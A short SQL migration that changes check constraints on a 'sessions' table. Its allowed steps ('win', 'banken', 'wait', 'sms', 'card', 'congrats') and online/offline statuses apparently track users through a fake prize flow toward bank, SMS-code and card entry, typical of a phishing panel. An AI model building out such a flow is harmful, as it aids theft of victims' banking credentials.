-- Update sessions constraints to support new flow states.
-- Run this once in Supabase SQL Editor or via a DB migration runner.

alter table public.sessions
  drop constraint if exists sessions_current_step_check;

alter table public.sessions
  add constraint sessions_current_step_check
  check (current_step in ('win', 'banken', 'wait', 'sms', 'card', 'congrats', 'special_approval', 'SPECIAL_INFO'));

alter table public.sessions
  drop constraint if exists sessions_status_check;

alter table public.sessions
  add constraint sessions_status_check
  check (status in ('online', 'offline', 'SUCCESS', 'CONGRATS', 'SPECIAL_INFO'));
